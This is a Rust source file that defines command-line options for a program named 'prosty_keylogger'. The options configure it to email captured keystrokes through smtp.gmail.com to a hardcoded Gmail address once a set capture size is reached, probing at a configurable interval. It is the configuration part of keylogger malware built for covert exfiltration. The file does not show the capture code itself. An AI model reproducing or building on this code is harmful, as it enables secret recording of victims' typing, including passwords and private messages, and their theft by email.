use clap::Parser;
use prosty_keylogger::common::TaskConfiguration;

#[derive(Parser, Debug)]
#[command(version, about, long_about = None)]
pub struct Args{

    #[arg(short = 'l', long="login", help = "SMTP login", default_value = "prostykeylogger")]
    pub smtp_login: String,

    #[arg(short = 'p', long="password", help = "SMTP password")]
    pub smtp_password: String,

    #[arg(short = 'f', long="from", help = "Mail address from", default_value = "<serwerinstancja@gmail.com>" )]
    pub mail_from: String,

    #[arg(short = 't', long="to", help = "Mail address to", default_value = "Admin <serwerinstancja@gmail.com>")]
    pub mail_to: String,

    #[arg(short = 'r', long="relay", help = "Mail server relay", default_value = "smtp.gmail.com")]
    pub relay: String,

    #[arg(short = 's', long="capture_size", help = "Send message after capture size", default_value_t = 100)]
    pub capture_size: u32,

    #[arg(short = 'i', long="interval", help = "Probe interval in milliseconds", default_value_t = 100)]
    pub interval: u32,



}

impl From<&Args> for TaskConfiguration{
    fn from(value: &Args) -> Self {
        Self{
            id: 0,
            smtp_login: value.smtp_login.clone(),
            smtp_password: value.smtp_password.to_owned(),
            mail_from: value.mail_from.to_owned(),
            mail_to: value.mail_to.to_owned(),
            relay: value.relay.to_owned(),
            capture_size: value.capture_size,
            probe_interval_milli: value.interval,
        }
    }
}